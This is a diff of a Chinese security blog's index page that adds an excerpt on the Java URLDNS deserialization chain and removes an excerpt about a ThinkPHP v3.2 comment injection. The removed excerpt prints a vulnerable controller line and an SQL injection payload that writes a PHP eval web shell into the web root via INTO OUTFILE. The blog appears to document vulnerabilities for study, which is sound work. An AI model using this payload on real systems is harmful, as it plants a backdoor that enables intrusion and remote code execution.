@@ -133,7 +133,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">144</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">145</span></a>
 
   </li>
         <li class="menu-item menu-item-schedule">
@@ -191,6 +191,90 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/URLDNS%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/20/URLDNS%E9%93%BE/" class="post-title-link" itemprop="url">URLDNS链</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-20 18:21:13" itemprop="dateCreated datePublished" datetime="2022-01-20T18:21:13+08:00">2022-01-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-23 03:07:56" itemprop="dateModified" datetime="2022-01-23T03:07:56+08:00">2022-01-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">java反序列化</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>URLDNS链其实就是DNSlog。可以用来判断目标是否出网或者漏洞是否利用成功。感觉就是判断是不是存在反序列化漏洞用的。</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>在反序列化中通过 <strong>readObject</strong> 来返回一个对象,如果一个类中重写了<strong>readObject</strong>，里面可能存在潜在危险利用链</p>
+<p>例如在Person.java中重写 <strong>readObject()</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/ef43ba34089b4b41b3e6d3a8e36e3600.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/01/20/URLDNS%E9%93%BE/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -941,88 +1025,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/cys.jpg">
-      <meta itemprop="name" content="Y0ng">
-      <meta itemprop="description" content="花有重开日，人无再少年">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y0ng的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/" class="post-title-link" itemprop="url">ThinkPHP v3.2 comment 注释注入写shell</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-01-09 18:25:52 / 修改时间：18:25:35" itemprop="dateCreated datePublished" datetime="2022-01-09T18:25:52+08:00">2022-01-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ThinkPHP%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" itemprop="url" rel="index"><span itemprop="name">ThinkPHP漏洞集合</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>comment函数是用来进行查询注释功能，当执行sql语句时，搭配comment可能存在利用注释进行 <code>写shell</code>或者 <code>时间盲注</code></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>控制器写入demo</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; M(&#39;Users&#39;)-&gt;comment($id)-&gt;find(intval($id));</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/80b3ae7446c643fca59b073466c53b0c.png#pic_center"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1094,7 +1096,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">144</span>
+          <span class="site-state-item-count">145</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
